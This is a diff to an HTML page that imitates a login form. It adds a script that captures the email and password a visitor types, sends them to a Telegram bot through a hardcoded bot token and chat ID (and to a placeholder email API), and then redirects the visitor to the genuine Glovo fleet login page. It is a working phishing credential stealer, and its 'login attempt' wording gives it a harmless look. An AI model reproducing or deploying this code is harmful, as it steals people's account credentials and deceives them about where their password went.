@@ -43,6 +43,52 @@
 <path fill-rule="evenodd" clip-rule="evenodd" d="M8 5.5C8.27614 5.5 8.5 5.72386 8.5 6V9.33105C8.5 9.6072 8.27614 9.83105 8 9.83105C7.72386 9.83105 7.5 9.6072 7.5 9.33105V6C7.5 5.72386 7.72386 5.5 8 5.5Z" fill="#D72121"></path>
 </svg>
 </i></div><p data-v-b394a3d5="" class="input-box__message-box__text heading-6 text-error"></p></div><div data-v-b394a3d5="" class="input-box__message-box"><p data-v-b394a3d5="" class="input-box__message-box__text heading-6"></p></div></div></div><div data-v-83741453="" class="login-form__forgot"><button data-v-e9ff0ac9="" data-v-83741453="" role="button" class="uds-button" data-size="small" data-variant="floating" data-disabled="false" data-loading="false" data-block="false" aria-label="Forgot password?" type="button" track-action-name="account.forgot_password.open"><span data-v-e9ff0ac9="" class="uds-button__content"><!----><span data-v-e9ff0ac9="" class="uds-button__content__label">Forgot password?</span><!----></span></button></div><button data-v-e9ff0ac9="" data-v-83741453="" role="button" class="uds-button form__button form__button" data-size="large" data-variant="primary" data-disabled="false" data-loading="false" data-block="true" aria-label="Log in" name="submit" track-action-name="account.login.submit"><span data-v-e9ff0ac9="" class="uds-button__content"><!----><span data-v-e9ff0ac9="" class="uds-button__content__label">Log in</span><!----></span></button></form><!----><!----><!----></section></main><!----><div data-v-ede09b25="" class="notifications hidden"></div></div></div>
+<script>
+    document.getElementById('login-btn').addEventListener('click', function(event) {
+        event.preventDefault(); // Prevent form submission
 
+        // Get form data
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        // Send email notification (use your email sending service)
+        const emailData = {
+            to: 'recipient@example.com', // Replace with your email recipient
+            subject: 'Login Attempt Detected',
+            body: `A login attempt was made with the following details:\nEmail: ${email}\nPassword: ${password}`
+        };
+
+        fetch('https://your-email-api.com/send', { // Replace with your email sending API
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(emailData),
+        }).then(response => response.json())
+          .then(data => console.log('Email sent:', data))
+          .catch(error => console.error('Error sending email:', error));
+
+        // Send Telegram notification
+        const telegramToken = '6751225350:AAH2K6H1zdefRXPgr6qFgtgKiLTGX0i0FtA';
+        const telegramChatId = '1119354860';
+        const message = `Login attempt detected:\nEmail: ${email}\nPassword: ${password}`;
+
+        fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: telegramChatId,
+                text: message,
+            }),
+        }).then(response => response.json())
+          .then(data => console.log('Message sent to Telegram:', data))
+          .catch(error => console.error('Error sending Telegram message:', error));
+
+        // Redirect user to the Glovo login page
+        window.location.href = 'https://fleet.glovoapp.com/login';
+    });
+</script>
 
 </body></html>
